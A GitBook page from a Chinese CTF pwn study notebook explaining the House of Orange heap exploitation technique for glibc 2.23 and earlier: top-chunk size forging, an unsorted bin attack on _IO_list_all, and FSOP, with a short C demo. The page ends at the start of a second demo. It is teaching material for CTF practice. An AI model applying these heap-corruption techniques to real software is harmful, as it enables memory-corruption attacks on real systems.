
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>House_of_Orange · Gitbook电子书</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        <meta name="author" content="TTY">
        
        
    
    <link rel="stylesheet" href="../../../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-search-pro/search.css">
                
            
                
                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-code/plugin.css">
                
            
                
                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
                
            
                
                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../../../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="../House_of_storm/House_of_storm.html" />
    
    
    <link rel="prev" href="../House_of_lore/House_of_lore.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../../../">
            
                <a href="../../../">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../../">
            
                <a href="../../">
            
                    
                    pwn
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1" data-path="../../pwn基础/">
            
                <a href="../../pwn基础/">
            
                    
                    pwn基础
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1.1" data-path="../../pwn基础/gdb使用/gdb使用.html">
            
                <a href="../../pwn基础/gdb使用/gdb使用.html">
            
                    
                    gdb使用
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.2" data-path="../../pwn基础/glibc更换_patchelf方法/glibc更换_patchelf方法.html">
            
                <a href="../../pwn基础/glibc更换_patchelf方法/glibc更换_patchelf方法.html">
            
                    
                    glibc更换_patchelf方法
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.3" data-path="../../pwn基础/linux系统调用号查询/linux系统调用号查询.html">
            
                <a href="../../pwn基础/linux系统调用号查询/linux系统调用号查询.html">
            
                    
                    linux系统调用号查询
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.4" data-path="../../pwn基础/pwn题编译时的保护选项/pwn题编译时的保护选项.html">
            
                <a href="../../pwn基础/pwn题编译时的保护选项/pwn题编译时的保护选项.html">
            
                    
                    pwn题编译时的保护选项
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.2.2" data-path="../../">
            
                <a href="../../">
            
                    
                    fmt
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.2.1" data-path="../../fmt/fmt/fmt.html">
            
                <a href="../../fmt/fmt/fmt.html">
            
                    
                    fmt
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2.2" data-path="../../fmt/fmtstr模块/fmtstr模块.html">
            
                <a href="../../fmt/fmtstr模块/fmtstr模块.html">
            
                    
                    fmtstr模块
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2.3" data-path="../../fmt/格式化字符串中的占位符特殊用法/格式化字符串中的占位符特殊用法.html">
            
                <a href="../../fmt/格式化字符串中的占位符特殊用法/格式化字符串中的占位符特殊用法.html">
            
                    
                    格式化字符串中的占位符特殊用法
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.2.3" data-path="../../rop/">
            
                <a href="../../rop/">
            
                    
                    rop
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.3.1" data-path="../../rop/ret2csu/ret2csu.html">
            
                <a href="../../rop/ret2csu/ret2csu.html">
            
                    
                    ret2csu
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.3.2" data-path="../../rop/通过mmap&mprotect来绕过nx/通过mmap&mprotect来绕过nx.html">
            
                <a href="../../rop/通过mmap&mprotect来绕过nx/通过mmap&mprotect来绕过nx.html">
            
                    
                    通过mmap&mprotect来绕过nx
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.3.3" data-path="../../rop/srop/srop.html">
            
                <a href="../../rop/srop/srop.html">
            
                    
                    srop
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.3.4" data-path="../../rop/dl_runtime_resolve/dl_runtime_resolve.html">
            
                <a href="../../rop/dl_runtime_resolve/dl_runtime_resolve.html">
            
                    
                    dl_runtime_resolve
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.3.5" data-path="../../rop/dl_runtime_resolve_64位/dl_runtime_resolve_64位.html">
            
                <a href="../../rop/dl_runtime_resolve_64位/dl_runtime_resolve_64位.html">
            
                    
                    dl_runtime_resolve_64位
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.3.6" data-path="../../rop/Ret2dlresolvePayload使用/Ret2dlresolvePayload使用.html">
            
                <a href="../../rop/Ret2dlresolvePayload使用/Ret2dlresolvePayload使用.html">
            
                    
                    Ret2dlresolvePayload使用
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.2.4" data-path="../">
            
                <a href="../">
            
                    
                    heap_related
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.4.1" data-path="../house_of_botcake/house_of_botcake.html">
            
                <a href="../house_of_botcake/house_of_botcake.html">
            
                    
                    house_of_botcake
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.2" data-path="../House_of_Einherjar/House_of_Einherjar.html">
            
                <a href="../House_of_Einherjar/House_of_Einherjar.html">
            
                    
                    House_of_Einherjar
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.3" data-path="../House_Of_Force/House_Of_Force.html">
            
                <a href="../House_Of_Force/House_Of_Force.html">
            
                    
                    House_Of_Force
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.4" data-path="../House_of_lore/House_of_lore.html">
            
                <a href="../House_of_lore/House_of_lore.html">
            
                    
                    House_of_lore
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="1.2.4.5" data-path="House_of_Orange.html">
            
                <a href="House_of_Orange.html">
            
                    
                    House_of_Orange
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.6" data-path="../House_of_storm/House_of_storm.html">
            
                <a href="../House_of_storm/House_of_storm.html">
            
                    
                    House_of_storm
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.7" data-path="../how2heap学习/how2heap解析.html">
            
                <a href="../how2heap学习/how2heap解析.html">
            
                    
                    how2heap解析
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.8" data-path="../large_bin_attack/large_bin_attack.html">
            
                <a href="../large_bin_attack/large_bin_attack.html">
            
                    
                    large_bin_attack
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.9" data-path="../ptmalloc_check/ptmalloc_check.html">
            
                <a href="../ptmalloc_check/ptmalloc_check.html">
            
                    
                    ptmalloc_check
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.10" data-path="../unlink攻击敏感指针/unlink攻击敏感指针.html">
            
                <a href="../unlink攻击敏感指针/unlink攻击敏感指针.html">
            
                    
                    unlink攻击敏感指针
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.11" data-path="../unsorted_bin相关攻击/unsorted_bin相关攻击.html">
            
                <a href="../unsorted_bin相关攻击/unsorted_bin相关攻击.html">
            
                    
                    unsorted_bin相关攻击
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.12" data-path="../_IO_2_1_stdout_泄露内存/_IO_2_1_stdout_泄露内存.html">
            
                <a href="../_IO_2_1_stdout_泄露内存/_IO_2_1_stdout_泄露内存.html">
            
                    
                    IO_2_1_stdout泄露内存
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.2.5" data-path="../../FILE_related/">
            
                <a href="../../FILE_related/">
            
                    
                    FILE_related
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.5.1" data-path="../../FILE_related/close_free/fog.html">
            
                <a href="../../FILE_related/close_free/fog.html">
            
                    
                    fog
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.5.2" data-path="../../FILE_related/FILE攻击的一些进阶操作_待补充/FILE攻击的一些进阶操作_待补充.html">
            
                <a href="../../FILE_related/FILE攻击的一些进阶操作_待补充/FILE攻击的一些进阶操作_待补充.html">
            
                    
                    FILE攻击的一些进阶操作_待补充
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.5.3" data-path="../../FILE_related/FILE结构体概述/FILE结构体概述.html">
            
                <a href="../../FILE_related/FILE结构体概述/FILE结构体概述.html">
            
                    
                    FILE结构体概述
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.5.4" data-path="../../FILE_related/FSOP/FSOP.html">
            
                <a href="../../FILE_related/FSOP/FSOP.html">
            
                    
                    FSOP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.5.5" data-path="../../FILE_related/vtable伪造/vtable伪造.html">
            
                <a href="../../FILE_related/vtable伪造/vtable伪造.html">
            
                    
                    vtable伪造
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.2.6" data-path="../../沙箱/">
            
                <a href="../../沙箱/">
            
                    
                    沙箱
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.6.1" data-path="../../沙箱/glibc2.27下堆题绕过沙箱/glibc2.27下堆题绕过沙箱.html">
            
                <a href="../../沙箱/glibc2.27下堆题绕过沙箱/glibc2.27下堆题绕过沙箱.html">
            
                    
                    glibc2.27下堆题绕过沙箱
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.6.2" data-path="../../沙箱/glibc2.29下堆题绕过沙箱/glibc2.29下堆题绕过沙箱.html">
            
                <a href="../../沙箱/glibc2.29下堆题绕过沙箱/glibc2.29下堆题绕过沙箱.html">
            
                    
                    glibc2.29下堆题绕过沙箱
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.6.3" data-path="../../沙箱/glibc2.31下堆题绕过沙箱/glibc2.31下堆题绕过沙箱.html">
            
                <a href="../../沙箱/glibc2.31下堆题绕过沙箱/glibc2.31下堆题绕过沙箱.html">
            
                    
                    glibc2.31下堆题绕过沙箱
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.6.4" data-path="../../沙箱/seccomp&ptcl/seccomp&ptcl.html">
            
                <a href="../../沙箱/seccomp&ptcl/seccomp&ptcl.html">
            
                    
                    seccomp&ptcl
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="../../../arm_pwn/">
            
                <a href="../../../arm_pwn/">
            
                    
                    arm_pwn
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1" data-path="../../../arm_pwn/arm&aarch64汇编/arm&aarch64汇编.html">
            
                <a href="../../../arm_pwn/arm&aarch64汇编/arm&aarch64汇编.html">
            
                    
                    arm&aarch64汇编
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.2" data-path="../../../arm_pwn/ARMpwn基础环境搭建/ARMpwn基础环境搭建.html">
            
                <a href="../../../arm_pwn/ARMpwn基础环境搭建/ARMpwn基础环境搭建.html">
            
                    
                    ARMpwn基础环境搭建
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.3" data-path="../../../arm_pwn/树莓派搭建ARM环境/树莓派搭建ARM环境.html">
            
                <a href="../../../arm_pwn/树莓派搭建ARM环境/树莓派搭建ARM环境.html">
            
                    
                    树莓派搭建ARM环境
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="../../../kernel_pwn/">
            
                <a href="../../../kernel_pwn/">
            
                    
                    kernel_pwn
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1" data-path="../../../kernel_pwn/c文件操作/c文件操作.html">
            
                <a href="../../../kernel_pwn/c文件操作/c文件操作.html">
            
                    
                    c文件操作
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2" data-path="../../../kernel_pwn/kernel_pwn_rop/kernel_pwn_rop.html">
            
                <a href="../../../kernel_pwn/kernel_pwn_rop/kernel_pwn_rop.html">
            
                    
                    kernel_pwn_rop
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.3" data-path="../../../kernel_pwn/linux_kernel保护机制/linux_kernel保护机制.html">
            
                <a href="../../../kernel_pwn/linux_kernel保护机制/linux_kernel保护机制.html">
            
                    
                    linux_kernel保护机制
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.4" data-path="../../../kernel_pwn/linux_kernel基础/linux_kernel基础.html">
            
                <a href="../../../kernel_pwn/linux_kernel基础/linux_kernel基础.html">
            
                    
                    linux_kernel基础
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.5" data-path="../../../kernel_pwn/ropper简单使用/ropper简单使用.html">
            
                <a href="../../../kernel_pwn/ropper简单使用/ropper简单使用.html">
            
                    
                    ropper简单使用
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5" data-path="../../../awd/">
            
                <a href="../../../awd/">
            
                    
                    awd
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.1" data-path="../../../awd/awd_pwn流量转发_手动/awd_pwn流量转发_手动.html">
            
                <a href="../../../awd/awd_pwn流量转发_手动/awd_pwn流量转发_手动.html">
            
                    
                    awdpwn流量转发手动
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.2" data-path="../../../awd/evilPatcher_pwn通防/evilPatcher_pwn通防.html">
            
                <a href="../../../awd/evilPatcher_pwn通防/evilPatcher_pwn通防.html">
            
                    
                    evilPatcher_pwn通防
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3" data-path="../../../awd/如何在awd中苟活_pwn/如何在awd中苟活_pwn.html">
            
                <a href="../../../awd/如何在awd中苟活_pwn/如何在awd中苟活_pwn.html">
            
                    
                    如何在awd中苟活_pwn
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="2.1" data-path="../../../IOT漏洞挖掘/">
            
                <a href="../../../IOT漏洞挖掘/">
            
                    
                    IOT漏洞挖掘
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.1" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/">
            
                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/">
            
                    
                    IoT-vulhub学习
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.1.1" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/Cisco-CVE-2020-3331/Cisco-CVE-2020-3331.html">
            
                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/Cisco-CVE-2020-3331/Cisco-CVE-2020-3331.html">
            
                    
                    Cisco-CVE-2020-3331
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.1.2" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/HUAWEI-CVE-2017-17215/HUAWEI-CVE-2017-17215.html">
            
                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/HUAWEI-CVE-2017-17215/HUAWEI-CVE-2017-17215.html">
            
                    
                    HUAWEI-CVE-2017-17215
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.1.3" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/Netgear-CVE-2019-20760/Netgear-CVE-2019-20760.html">
            
                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/Netgear-CVE-2019-20760/Netgear-CVE-2019-20760.html">
            
                    
                    Netgear-CVE-2019-20760
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.1.4" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2018-16333/Tenda-CVE-2018-16333.html">
            
                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2018-16333/Tenda-CVE-2018-16333.html">
            
                    
                    Tenda-CVE-2018-16333
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.1.5" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2018-5767/Tenda-CVE-2018-5767.html">
            
                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2018-5767/Tenda-CVE-2018-5767.html">
            
                    
                    Tenda-CVE-2018-5767
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.1.6" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2020-10987/Tenda-CVE-2020-10987.html">
            
                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2020-10987/Tenda-CVE-2020-10987.html">
            
                    
                    Tenda-CVE-2020-10987
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.1.7" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/TP-Link-CVE-2020-8423/TP-Link-CVE-2020-8423.html">
            
                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/TP-Link-CVE-2020-8423/TP-Link-CVE-2020-8423.html">
            
                    
                    TP-Link-CVE-2020-8423
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.1.8" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/VIVOTEK-CVE-2020-10987/VIVOTEK-CVE-2020-10987.html">
            
                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/VIVOTEK-CVE-2020-10987/VIVOTEK-CVE-2020-10987.html">
            
                    
                    VIVOTEK-CVE-2020-10987
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.2" data-path="../../../密码学/">
            
                <a href="../../../密码学/">
            
                    
                    密码学
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.2.1" data-path="../../../密码学/AES/AES.html">
            
                <a href="../../../密码学/AES/AES.html">
            
                    
                    AES
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2.2" data-path="../../../密码学/RC4/RC4.html">
            
                <a href="../../../密码学/RC4/RC4.html">
            
                    
                    RC4
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.3" data-path="../../../web/">
            
                <a href="../../../web/">
            
                    
                    web
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.3.1" data-path="../../../web/sql注入/sql注入.html">
            
                <a href="../../../web/sql注入/sql注入.html">
            
                    
                    sql注入
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.4" data-path="../../../机器学习/">
            
                <a href="../../../机器学习/">
            
                    
                    机器学习
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.4.1" data-path="../../../机器学习/pytorch/pytorch.html">
            
                <a href="../../../机器学习/pytorch/pytorch.html">
            
                    
                    pytorch
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.4.2" data-path="../../../机器学习/数据处理/数据处理.html">
            
                <a href="../../../机器学习/数据处理/数据处理.html">
            
                    
                    数据处理
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href="../../.." >House_of_Orange</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h2 id="house-of-orange">House Of Orange</h2>
<p>&#x672C;&#x8D28;&#xFF1A;Unsorted bin attack &#x548C; FSOP&#x9020;&#x6210;&#x7684;&#x7EC4;&#x5408;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x65B9;&#x5F0F;&#x3002;</p>
<p>House of orange&#x6E90;&#x4E8E;&#x4E00;&#x9053;&#x9898;&#x76EE;&#xFF0C;&#x6709;&#x65F6;&#x5019;&#x53EA;&#x7528;&#x5230;free top chunk&#x7684;&#x9898;&#x76EE;&#x4E5F;&#x4F1A;&#x88AB;&#x5F52;&#x5165;&#x8BE5;&#x7C7B;&#x4E2D;&#x3002;</p>
<h4 id="glibc&#x7248;&#x672C;223&#x60C5;&#x51B5;">glibc&#x7248;&#x672C;&lt;=2.23&#x60C5;&#x51B5;</h4>
<p><strong>&#x7279;&#x70B9;&#xFF1A;&#x4E0D;&#x9700;&#x8981;free&#x64CD;&#x4F5C;</strong></p>
<p>&#x6838;&#x5FC3;&#x539F;&#x7406;&#xFF1A;</p>
<p><strong>1&#xFF0C;&#x83B7;&#x53D6;unsorted bin</strong></p>
<p>&#x5728;<code>_int_malloc</code>&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x4F1A;&#x4F9D;&#x6B21;&#x68C0;&#x9A8C; fastbin&#x3001;small bins&#x3001;unsorted bin&#x3001;large bins &#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6EE1;&#x8DB3;&#x5206;&#x914D;&#x8981;&#x6C42;&#xFF0C;&#x56E0;&#x4E3A;&#x5C3A;&#x5BF8;&#x95EE;&#x9898;&#x8FD9;&#x4E9B;&#x90FD;&#x4E0D;&#x7B26;&#x5408;&#x3002;&#x63A5;&#x4E0B;&#x6765;<code>_int_malloc</code>&#x51FD;&#x6570;&#x4F1A;&#x8BD5;&#x56FE;&#x4F7F;&#x7528; top chunk&#xFF0C;&#x5728;&#x8FD9;&#x91CC; top chunk &#x4E5F;&#x4E0D;&#x80FD;&#x6EE1;&#x8DB3;&#x5206;&#x914D;&#x7684;&#x8981;&#x6C42;&#xFF0C;&#x5219;&#x6267;&#x884C; sysmalloc &#x6765;&#x5411;&#x7CFB;&#x7EDF;&#x7533;&#x8BF7;&#x66F4;&#x591A;&#x7684;&#x7A7A;&#x95F4;&#x3002;<strong>&#x8FD9;&#x65F6;top_chunk&#x4F1A;&#x88AB;&#x653E;&#x5165;unsorted bin&#x4E2D;&#xFF08; top chunk size &#x6EE1;&#x8DB3;&#x4E00;&#x5B9A;&#x6761;&#x4EF6;&#xFF09;&#x3002;</strong></p>
<p>&#x7531;&#x4E8E;top chunk size&#x4E00;&#x822C;&#x4F1A;&#x5F88;&#x5927;&#xFF0C;&#x4E00;&#x822C;&#x91C7;&#x7528;&#x76F4;&#x63A5;&#x4F2A;&#x9020;&#x5176;&#x5927;&#x5C0F;&#xFF0C;&#x5177;&#x4F53;&#x4F2A;&#x9020;&#x7684;&#x539F;&#x7406;&#x53C2;&#x8003;wiki&#xFF0C;<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange-zh/&#xFF0C;&#x8FD9;&#x91CC;&#x8FD9;&#x91CC;&#x53EA;&#x7ED9;&#x51FA;&#x4F2A;&#x9020;&#x7684;" target="_blank">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange-zh/&#xFF0C;&#x8FD9;&#x91CC;&#x8FD9;&#x91CC;&#x53EA;&#x7ED9;&#x51FA;&#x4F2A;&#x9020;&#x7684;</a> top chunk size &#x7684;&#x8981;&#x6C42;</p>
<ul>
<li><p>&#x4F2A;&#x9020;&#x7684; size &#x5FC5;&#x987B;&#x8981;&#x5BF9;&#x9F50;&#x5230;&#x5185;&#x5B58;&#x9875;</p>
</li>
<li><p>size &#x8981;&#x5927;&#x4E8E; MINSIZE(0x10)</p>
</li>
<li>size &#x8981;&#x5C0F;&#x4E8E;&#x4E4B;&#x540E;&#x7533;&#x8BF7;&#x7684; chunk size + MINSIZE(0x10)</li>
<li>size &#x7684; prev inuse &#x4F4D;&#x5FC5;&#x987B;&#x4E3A; 1</li>
</ul>
<p>&#x6F14;&#x793A;&#x7A0B;&#x5E8F;</p>
<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> fake_size 0x1fe1</span>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span>
</span>{
    <span class="hljs-keyword">void</span> *ptr;
    <span class="hljs-keyword">int</span> i;
    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);
    ptr=(<span class="hljs-keyword">void</span> *)((<span class="hljs-keyword">int</span>)ptr+<span class="hljs-number">24</span>);
    *((<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>*)ptr)=fake_size;
    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x2000</span>);
    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>);
}
</code></pre>
<pre><code>fake_size &#x53EF;&#x4EE5;&#x662F; 0x0fe1&#x3001;0x1fe1&#x3001;0x2fe1&#x3001;0x3fe1 &#x7B49;&#x5BF9; 4kb &#x5BF9;&#x9F50;&#x7684; size&#xFF0C;&#x8FD9;&#x91CC;&#x9009;&#x62E9;&#x4E86;0x1fe1&#x3002;

&#x6267;&#x884C;malloc(0x2000)&#x4E4B;&#x540E;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x6210;&#x529F;&#x4F7F;&#x539F;&#x5148;top chunk&#x653E;&#x5165;&#x4E86;unsorted bin
</code></pre><p><img src="1.png" alt=""></p>
<p>&#x518D;&#x6B21;&#x6267;&#x884C;malloc(0x60)&#x4F1A;&#x4ECE;unsorted bin&#x4E2D;&#x5207;&#x51FA;&#x3002;</p>
<p><img src="2.png" alt=""></p>
<p>&#x5E76;&#x4E14;&#x6B64;&#x65F6;&#x5806;&#x5730;&#x5740;&#x548C;libc&#x5730;&#x5740;&#x4FE1;&#x606F;&#x90FD;&#x88AB;&#x6CC4;&#x9732;&#x4E86;&#xFF0C;&#x770B;&#x5230;&#x6709;&#x4E9B;&#x535A;&#x5BA2;&#x8BF4;&#x5FC5;&#x987B;&#x7533;&#x8BF7;large bin&#x5927;&#x5C0F;&#x7684;chunk&#x624D;&#x4F1A;&#x51FA;&#x73B0;&#x5806;&#x6CC4;&#x9732;&#xFF0C;&#x4F46;&#x8FD9;&#x91CC;&#x6211;&#x58F0;&#x8BF7;&#x4E00;&#x4E2A;&#x5C0F;&#x7684;chunk&#x4E5F;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x6CC4;&#x9732;&#xFF0C;&#x6682;&#x65F6;&#x5B58;&#x7591;&#x3002;</p>
<p><img src="3.png" alt=""></p>
<p><strong>2&#xFF0C;Unsorted Bin Attack</strong></p>
<p>Unsorted Bin Attack&#x7684;&#x539F;&#x7406;&#x4E0D;&#x518D;&#x8D58;&#x8FF0;&#xFF0C;&#x5176;&#x7ED3;&#x679C;&#x662F;&#x4FEE;&#x6539;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x53D8;&#x6210;&#x4E00;&#x4E2A;&#x5927;&#x6570;&#x5B57;&#xFF08;&#x8FD9;&#x91CC;&#x8FD9;&#x4E2A;&#x6570;&#x5B57;&#x5C31;&#x662F;unsorted bin&#x7684;&#x5730;&#x5740;&#xFF09;&#x3002;&#x8FD9;&#x91CC;&#x8FD9;&#x4E2A;&#x88AB;&#x4FEE;&#x6539;&#x7684;&#x662F;_IO_list_all&#x6307;&#x9488;&#xFF0C;&#x8FD9;&#x91CC;&#x4F7F;&#x4ED6;&#x6307;&#x5411;unsorted bin&#x3002;</p>
<p><strong>3&#xFF0C;FSOP</strong></p>
<p>&#x8FD9;&#x91CC;_IO_list_all&#x6307;&#x5411;unsorted bin&#x7684;&#x5730;&#x5740;&#x3002;</p>
<p>&#x6F14;&#x793A;&#x4EE3;&#x7801;</p>
<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
